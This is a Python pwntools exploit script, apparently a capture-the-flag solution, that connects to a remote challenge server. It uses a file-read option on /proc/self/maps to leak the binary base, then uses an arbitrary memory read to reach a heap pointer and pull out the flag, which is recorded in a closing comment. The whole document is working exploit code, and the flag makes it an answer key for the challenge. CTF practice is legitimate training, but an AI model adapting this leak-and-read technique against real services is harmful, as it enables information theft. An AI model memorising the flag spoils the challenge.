from pwn import *


# leak binary base with /proc/self/maps
# write 1 byte as feedback 
# calculate @feedback (in bss)
# read from memory (feedback)

feedback_bss_offset = 0x0000000000004050



#p = process("./capture_the_flaaaaaaaaaaaaag")

p = remote("chall.polygl0ts.ch" ,9003)
p.sendlineafter(b'>',b'3')
p.sendlineafter(b'>',b'')

p.sendlineafter(b'>',b'1')
p.sendlineafter(b'>',b'/proc/self/maps')

binary_base_b = b'0x'+(p.recvline()[:-1].split(b'-')[0]).strip()

binary_base = int(binary_base_b.decode(),16) 
print(hex(binary_base))

feedback_binary = binary_base+feedback_bss_offset
feedback_binary_hex =hex(feedback_binary).encode()
print("feedback :",  feedback_binary_hex)


p.sendlineafter(b'>',b'2')
p.sendlineafter(b'>',feedback_binary_hex)


heap_address = u64((p.recvline().strip()+b'\x00'*2))

heap_address__to_read = hex(heap_address+4).encode()

print("flag heap :", heap_address__to_read)

p.sendline(b'2')
p.sendlineafter(b'>',heap_address__to_read)

# gdb.attach(p)

p.interactive()

# EPFL{why_h4ve_a_s1ngle_ch4r4ct3r_wh3n_fread_gives_you_7he_wh0l3_fl4g}